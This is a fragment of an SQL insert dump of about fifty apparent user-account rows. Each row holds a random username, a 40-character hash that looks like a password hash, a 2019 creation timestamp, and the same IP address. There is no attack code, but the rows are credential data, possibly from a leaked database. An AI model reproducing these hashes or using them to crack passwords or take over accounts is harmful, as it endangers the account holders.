(918, 'w8AzHErerEh3', 'c60cea6d570ed8a86c7fc7db9bb88506130dde27', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'w8AzHErerEh3', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'c60cea6d570ed8a86c7fc7db9bb88506130dde27', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(917, 'Mfe3KT9DZRaK', '35900f7e91d7ed4f12f302566d0e2ce5f5e223ae', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'Mfe3KT9DZRaK', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '35900f7e91d7ed4f12f302566d0e2ce5f5e223ae', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(916, 'C4tK37PdxsXf', '21e3b28a4114e6d9e3c212a0ed475c9a04b15f57', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'C4tK37PdxsXf', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '21e3b28a4114e6d9e3c212a0ed475c9a04b15f57', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(915, 'K6YNYGCs2kSC', '21abde21cf0d2c623e836b294e3ad6f2dfb65cec', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'K6YNYGCs2kSC', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '21abde21cf0d2c623e836b294e3ad6f2dfb65cec', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(914, 'NpzZWk6CG5Cn', 'e007cc21097f4ec3522c7bcfd8eed5232d96e4b1', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'NpzZWk6CG5Cn', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'e007cc21097f4ec3522c7bcfd8eed5232d96e4b1', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(913, 'BCcW2FMuMCKT', 'c1fcef82b1b46b73eba4ac98a69391a2ef1a4357', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'BCcW2FMuMCKT', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'c1fcef82b1b46b73eba4ac98a69391a2ef1a4357', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(912, 'gVsZMtUfkrTy', 'a07847ce4e28ab7f83e71d92bfd8ec1e600143a7', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'gVsZMtUfkrTy', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'a07847ce4e28ab7f83e71d92bfd8ec1e600143a7', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(911, '963ut8Waff8m', '02abb1775e4e4423b1934b6cec234de7212d4d52', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, '963ut8Waff8m', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '02abb1775e4e4423b1934b6cec234de7212d4d52', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(910, 'VUeTtkhfAc6C', 'e597d84de6e4b89a649adc7144609540a8395b6e', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'VUeTtkhfAc6C', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'e597d84de6e4b89a649adc7144609540a8395b6e', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(909, 'RHfNS8FBW4pR', '2561bdae695c30d97a1546a2c18262e7751c67b8', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'RHfNS8FBW4pR', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2561bdae695c30d97a1546a2c18262e7751c67b8', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(908, 'r6hXXbM7uhb2', '00cad4aec47844c7da2f9e25b6342db22d524cf4', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'r6hXXbM7uhb2', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '00cad4aec47844c7da2f9e25b6342db22d524cf4', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(907, 'N8mfX9X8NX2p', '03d466de037b553473f90c5f657d0afcd44bc3f9', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'N8mfX9X8NX2p', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '03d466de037b553473f90c5f657d0afcd44bc3f9', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(906, 'ufrShtRtrPvR', '258fafb2c3241597e98a882089e7c3b6c6a31dc9', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'ufrShtRtrPvR', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '258fafb2c3241597e98a882089e7c3b6c6a31dc9', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(905, '5KPdP6zpM2h7', '5a8c9b91ea72f90241548d391838b64226d28da8', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, '5KPdP6zpM2h7', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '5a8c9b91ea72f90241548d391838b64226d28da8', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(904, 'WRwB9es6NfwX', 'b699e147fdfb5b86a12ef4a5ad228f9c5e900ef6', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'WRwB9es6NfwX', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'b699e147fdfb5b86a12ef4a5ad228f9c5e900ef6', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(903, '4gnkgv6ZsyV3', '6d4f6254027a984114e95f04649c85f0579c103d', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, '4gnkgv6ZsyV3', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '6d4f6254027a984114e95f04649c85f0579c103d', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(902, 'yENUbHafs7n5', 'b28dc8e2497f85b6c5ad145fa673ff2e22304520', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'yENUbHafs7n5', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'b28dc8e2497f85b6c5ad145fa673ff2e22304520', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(901, 'PbUT5FckWtvb', 'f04e227046834b7c4b5b82963036769d1210771f', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'PbUT5FckWtvb', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'f04e227046834b7c4b5b82963036769d1210771f', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(900, 'Up6p4EccctAA', 'ce86e7a41bf406fa8d27ede803d4f5837c910ed1', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'Up6p4EccctAA', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'ce86e7a41bf406fa8d27ede803d4f5837c910ed1', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(899, 'T5xbSfWNDzbB', '268ce2351a8554f4b3056c019d1d27e8b7abae2b', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'T5xbSfWNDzbB', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '268ce2351a8554f4b3056c019d1d27e8b7abae2b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(898, '4G5pMCu4S6d4', 'a35286e9da9c2ba0c6ee47303b2d104ad3a8e90a', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, '4G5pMCu4S6d4', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'a35286e9da9c2ba0c6ee47303b2d104ad3a8e90a', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(894, '6tnVA4Gcy9xp', 'e0ec25ec22a6fdf0b8655621e82566af86fa2b71', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, '6tnVA4Gcy9xp', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'e0ec25ec22a6fdf0b8655621e82566af86fa2b71', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(893, 'AT3VSdfdPTv2', '8c43a1ef4c6c7964ed61b31c8d923ff427fc60c3', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'AT3VSdfdPTv2', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '8c43a1ef4c6c7964ed61b31c8d923ff427fc60c3', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(892, 'zNphsuPZE3aW', 'b28717dcddd3cfa7339f5ba9372c493262127cbf', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'zNphsuPZE3aW', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'b28717dcddd3cfa7339f5ba9372c493262127cbf', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(891, 'hvNHmrPxDpZp', '5770f123423c97456b503c302f07d6891fdac9ba', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'hvNHmrPxDpZp', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '5770f123423c97456b503c302f07d6891fdac9ba', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(890, 'rxagYMBGyzew', '5c3112fea27f16dd29bac016d3d989ea865646be', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'rxagYMBGyzew', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '5c3112fea27f16dd29bac016d3d989ea865646be', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(889, 'rNRNsK7ryRaB', '9730b03dbd83088f1a7822f14d2da4f21d9f6920', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'rNRNsK7ryRaB', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '9730b03dbd83088f1a7822f14d2da4f21d9f6920', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(888, 'vz7tHsNuNBeb', '2cbfb6263942395f55c72411bc34737bf2262258', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'vz7tHsNuNBeb', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2cbfb6263942395f55c72411bc34737bf2262258', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(887, 'p874ZzRpfHHW', 'ee49c69aa2e3976f4e1d190e15a0dbf7d84091d8', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'p874ZzRpfHHW', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'ee49c69aa2e3976f4e1d190e15a0dbf7d84091d8', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(886, '7ghHfSkT2Vtc', '3e2f79cf478b2da3256a24b252ab7978915b40b8', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, '7ghHfSkT2Vtc', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '3e2f79cf478b2da3256a24b252ab7978915b40b8', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(885, 'HhaU8vaPs3bS', 'd167ff925332fe6539c1fd39a7d75d4c2800e744', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'HhaU8vaPs3bS', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'd167ff925332fe6539c1fd39a7d75d4c2800e744', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(884, 'PyFx9Y3Tyh5K', '5cac145043ce68adf4d1eb75be3f1f290eeefb84', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'PyFx9Y3Tyh5K', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '5cac145043ce68adf4d1eb75be3f1f290eeefb84', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(883, 'HsUu9Y85eGsN', '3065627b547d9cd19e3e077b224e05071dcbba13', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'HsUu9Y85eGsN', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '3065627b547d9cd19e3e077b224e05071dcbba13', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(882, 'SGubbteu2mcZ', 'c70c64a664d1ab9587ed621275c6d377d0746126', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'SGubbteu2mcZ', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'c70c64a664d1ab9587ed621275c6d377d0746126', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(881, 'ma8UEsSCZfyp', '309bf9b6e44ec3d831b4882def2a73a3949b9d7a', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'ma8UEsSCZfyp', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '309bf9b6e44ec3d831b4882def2a73a3949b9d7a', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(880, 'WddBmNyReXXy', 'ae15ac8cfaa6c09a6eb218f7aa1d030a84b617d1', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'WddBmNyReXXy', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'ae15ac8cfaa6c09a6eb218f7aa1d030a84b617d1', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(879, 'pMpcAsCkNPvw', '7ffec92c8e5d805116f8c61ba27a17eeac002cdc', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'pMpcAsCkNPvw', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7ffec92c8e5d805116f8c61ba27a17eeac002cdc', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(878, 'ShRuUsCGHXut', '5e4f85bff5f73a2020e24eb7ff16cad7e16db3a5', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'ShRuUsCGHXut', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '5e4f85bff5f73a2020e24eb7ff16cad7e16db3a5', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(877, 'FwKXZzDaVEXC', '8903d84a8f7f20f6d059c63aaa4ee163ca86fe57', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'FwKXZzDaVEXC', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '8903d84a8f7f20f6d059c63aaa4ee163ca86fe57', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(876, 'GgV6UTPR8x96', '5f3a76e557d352d870902433fe32fba9a995eec1', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'GgV6UTPR8x96', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '5f3a76e557d352d870902433fe32fba9a995eec1', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(875, 'nENKdKYD9NE4', '2918f4357dfd5a12bb3a1d99e3ccfbe32ec78677', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'nENKdKYD9NE4', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2918f4357dfd5a12bb3a1d99e3ccfbe32ec78677', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(874, 'bvaA3ZU6EesM', 'c6820ae797ee1fa75d6fc8efb3e72ead2433801a', '2019-04-30 14:21:34', '115.194.38.239', 1000, 10, 'bvaA3ZU6EesM', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'c6820ae797ee1fa75d6fc8efb3e72ead2433801a', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(873, 'tyFY8YYdSGSA', '5b153a009e84038c78c52053c4538649f9f95f1a', '2019-04-30 14:21:34', '115.194.38.239', 1000, 10, 'tyFY8YYdSGSA', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '5b153a009e84038c78c52053c4538649f9f95f1a', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(872, '2SfDm8t7uuNS', 'cefd1072ba7f9c77b204b4b820df6348efff8227', '2019-04-30 14:21:34', '115.194.38.239', 1000, 10, '2SfDm8t7uuNS', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'cefd1072ba7f9c77b204b4b820df6348efff8227', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(871, '6UFaF9CxdP3G', '31b738fc61190ebaf5c7e909eb2d2f2aa6467297', '2019-04-30 14:21:34', '115.194.38.239', 1000, 10, '6UFaF9CxdP3G', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '31b738fc61190ebaf5c7e909eb2d2f2aa6467297', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(870, 'vEtpZRm2CEEu', '909d33305175c464650c3b4ee43ed675144f1226', '2019-04-30 14:21:34', '115.194.38.239', 1000, 10, 'vEtpZRm2CEEu', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '909d33305175c464650c3b4ee43ed675144f1226', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
